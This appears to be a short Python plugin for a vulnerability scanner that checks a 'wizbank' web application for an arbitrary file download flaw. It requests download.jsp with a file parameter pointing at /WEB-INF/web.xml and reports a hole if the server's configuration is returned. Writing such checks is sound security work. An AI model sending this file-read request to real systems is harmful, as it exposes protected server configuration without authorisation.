#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service, arg):
    if service == "wizbank":
        return True, arg

def audit(arg):
    url = arg + "cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
    code,head,res,errorcode,_url = curl.curl2(url)
    if code==200 and 'log4jConfigLocation' in res :
        security_hole(url)
    


        return arg
if __name__== '__main__':
    from dummy import *
